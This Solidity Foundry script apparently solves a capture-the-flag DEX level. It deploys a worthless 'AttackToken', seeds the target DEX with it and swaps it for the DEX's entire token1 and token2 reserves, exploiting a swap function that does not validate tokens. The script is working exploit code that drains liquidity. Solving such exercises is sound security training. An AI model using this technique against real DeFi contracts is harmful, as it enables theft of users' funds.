// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract AttackToken {
    string public name = "AttackToken";
    string public symbol = "ATK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 supply) {
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "no balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "no balance");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        balanceOf[from] -= amount;
        allowance[from][msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SolveScript is Script {
    address public target = 0x47bF974Cf85584549DCA303933dC37BDa2A47933;
    address public player = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    function run() public {
        vm.startBroadcast();

        IDexTwo dex = IDexTwo(target);
        address t1 = dex.token1();
        address t2 = dex.token2();

        logBalances(t1, t2);

        AttackToken atk = new AttackToken(4 ether);

        atk.transfer(target, 1 ether);
        atk.approve(target, type(uint256).max);

        // swap atk -> token1
        dex.swap(address(atk), t1, 1 ether);

        // swap atk -> token2
        dex.swap(address(atk), t2, 2 ether);
        logBalances(t1, t2);
        vm.stopBroadcast();
    }

    function logBalances(address t1, address t2) internal view {
        console.log("DEX token1:", IERC20(t1).balanceOf(target));
        console.log("DEX token2:", IERC20(t2).balanceOf(target));
        console.log("Player token1:", IERC20(t1).balanceOf(player));
        console.log("Player token2:", IERC20(t2).balanceOf(player));
    }
}
